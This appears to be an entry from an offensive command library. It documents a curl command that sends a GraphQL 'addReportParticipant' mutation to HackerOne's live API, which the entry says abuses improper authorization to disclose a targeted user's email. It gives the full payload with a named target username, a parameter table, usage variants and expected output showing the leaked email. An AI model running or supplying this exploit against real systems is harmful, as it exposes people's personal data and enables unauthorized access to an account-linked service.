---
data: >-
  curl -X POST https://hackerone.com/graphql -H "Content-Type: application/json"
  -H "Cookie: YOUR_SESSION_COOKIE" -d '{"query":"mutation
  AddReportParticipant($input:AddReportParticipantInput!)
  {addReportParticipant(input:$input)
  {clientMutationId,was_successful,errors{nodes{message}},invitation{email,token}}}","variables":{"input":{"report_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82MjYzNzE=","email":"placeholder@example.com","username":"jobert"}}}'
tags:
  - graphql
  - exploit
  - pii
type: command
output: >-
  {"data":{"addReportParticipant":{"clientMutationId":null,"was_successful":true,"errors":{"nodes":[]},"invitation":{"email":"target@example.com","token":null}}}}
executor: curl
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:00.463Z'
id: f2658393-9eea-457c-b782-21e9e6956e06
verified: false
validated: true
submitted: true
---
# graphql-add-participant

## Command

```bash
curl -X POST https://hackerone.com/graphql -H "Content-Type: application/json" -H "Cookie: YOUR_SESSION_COOKIE" -d '{"query":"mutation AddReportParticipant($input:AddReportParticipantInput!) {addReportParticipant(input:$input) {clientMutationId,was_successful,errors{nodes{message}},invitation{email,token}}}","variables":{"input":{"report_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82MjYzNzE=","email":"placeholder@example.com","username":"jobert"}}}' 
```

## Description

This curl command executes a GraphQL mutation to add a report participant by username on HackerOne, exploiting improper authorization to disclose the target's email in the invitation response. Use it in authenticated sessions to test or demonstrate the vulnerability.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `-H "Content-Type: application/json"` | Sets JSON payload header | Yes |
| `-H "Cookie: YOUR_SESSION_COOKIE"` | Provides authentication cookie (replace with valid session) | Yes |
| `-d '{...}'` | JSON payload with query and variables | Yes |
| `report_id` | Base64-encoded Global ID of the report | Yes |
| `email` | Placeholder email (ignored when username provided) | Yes (placeholder) |
| `username` | Target username to invite and disclose email for | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://hackerone.com/graphql -H "Content-Type: application/json" -H "Cookie: session=abc123" -d '{"query":"...","variables":{"input":{"report_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82MjYzNzE=","email":"fake@ex.com","username":"jobert"}}}' 
```

### Advanced Usage

Add verbose output for debugging:

```bash
curl -v -X POST https://hackerone.com/graphql -H "Content-Type: application/json" -H "Cookie: session=abc123" -d '{...}'
```

## Expected Output

Successful execution returns a JSON response indicating success and the leaked email:

```json
{"data":{"addReportParticipant":{"clientMutationId":null,"was_successful":true,"errors":{"nodes":[]},"invitation":{"email":"target@hackerone.com","token":null}}}}
```
The email field reveals the target's PII; errors array empty on success.

## Related

- [[Related Procedure|procedures/Exploit-GraphQL-Mutation-to-Disclose-Email]]
